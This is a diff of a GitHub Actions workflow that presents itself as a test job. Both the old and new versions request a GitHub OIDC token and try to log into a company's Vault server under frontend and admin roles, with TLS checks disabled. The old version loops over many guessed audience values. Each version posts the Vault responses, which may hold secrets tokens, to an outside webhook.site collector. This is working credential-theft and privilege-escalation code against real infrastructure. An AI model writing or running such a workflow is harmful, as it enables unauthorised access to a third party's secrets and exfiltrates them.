@@ -1,36 +1,23 @@
-name: Frontend Role
+name: Default Aud
 on:
   workflow_dispatch:
 permissions:
   id-token: write
   contents: read
 jobs:
-  scan:
+  test:
     runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        aud:
-          - "vault"
-          - "ormi"
-          - "ormi-labs"
-          - "0xgraph"
-          - "argo-cd"
-          - "argo-workflows-sso"
-          - "argocd"
-          - "argocd-cli"
-          - "dolomite"
-          - "frontend"
-          - "app"
-          - "https://app.ormilabs.com"
-          - "https://admin.ormi.dev"
     steps:
-      - name: Try
+      - name: Default audience (no audience param)
         run: |
-          AUD_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${{ matrix.aud }}', safe=''))")
-          OIDC=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD_ENC}" | jq -r '.value // empty')
-          if [ -n "$OIDC" ]; then
-            R1=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"frontend\",\"jwt\":\"$OIDC\"}" 2>&1)
-            R2=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC\"}" 2>&1)
-            curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -H "Content-Type: application/json" \
-              -d "{\"aud\":\"${{ matrix.aud }}\",\"frontend\":$(echo $R1 | jq -Rs .),\"admin\":$(echo $R2 | jq -Rs .)}"
-          fi
+          # audience 파라미터 없이 — 기본 audience 사용
+          OIDC=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r '.value')
+          
+          # 기본 audience 확인
+          AUD=$(echo "$OIDC" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r '.aud' 2>/dev/null)
+          
+          R1=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"frontend\",\"jwt\":\"$OIDC\"}" 2>&1)
+          R2=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC\"}" 2>&1)
+          
+          curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -H "Content-Type: application/json" \
+            -d "{\"default_aud\":\"$AUD\",\"frontend\":$(echo $R1 | jq -Rs .),\"admin\":$(echo $R2 | jq -Rs .)}"
